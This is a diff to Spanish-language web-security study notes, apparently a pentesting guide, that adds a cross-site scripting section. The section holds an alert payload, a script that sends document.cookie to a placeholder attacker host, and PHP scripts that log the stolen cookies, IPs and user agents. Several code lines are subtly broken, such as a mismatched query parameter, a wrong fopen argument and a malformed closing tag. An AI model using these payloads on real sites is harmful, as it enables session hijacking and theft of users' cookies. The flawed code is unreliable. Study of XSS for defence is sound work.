@@ -175,6 +175,8 @@ Pero para conecciones HTTPS podemos interceptarlo con ***openssl*** por el puert
 openssl s_client -connect {Host}:443
 ```
 
+![](/assets/images/HTTP.jpeg)
+
 ## Cookies and Sessions
 
 Para los conceptos de Cookies y Sesiones tenemos toda la informacion en el siguiente link [Cookies and Sessions](https://programacionymas.com/blog/cookies-y-sesiones)
@@ -237,4 +239,45 @@ Al momento de realizar busquedas en google existen algunos caracterecs basicos q
 
 ![](/assets/images/Google.jpeg)
 
+## Cross Site Scripting 
 
+Para saber si una pagina es vulnerables una de las formas mas conocidas para identificarlo es ingresando etiquetas o ingresando scripts.
+
+```javascript
+<script>alert(document.cookie)</script>
+```
+Con esto saldra nuestra cookie de sesion en una ventana de alerta, para poder recibir cookies importantes podemos optar por mandarnos la cookie a traves de un script.
+
+```javascript
+<script>
+var i = new Image();
+i.src="IP/DOMINIO"+document.cookie;
+</script>
+```
+
+Mientras en el lado del servidor configuramos un archivo php para poder recibir la informacion.
+
+```php
+<?php
+$filename="/tmp/log.txt";
+$fp=fopen($filename, 'a');
+$cookie=$_GET['q'];
+fwrite($fp, $cookie);
+fclose($fp)
+?>
+```
+
+```php
+<?php
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+$fp = fopen('log.txt'. 'a');
+
+fwrite($fp, $ip.' '.$browser." \n");
+fwrite($fp, urlencode($_SERVER['QUERY_STRING']). " \n\n");
+fclose($fp);
+
+>
+```
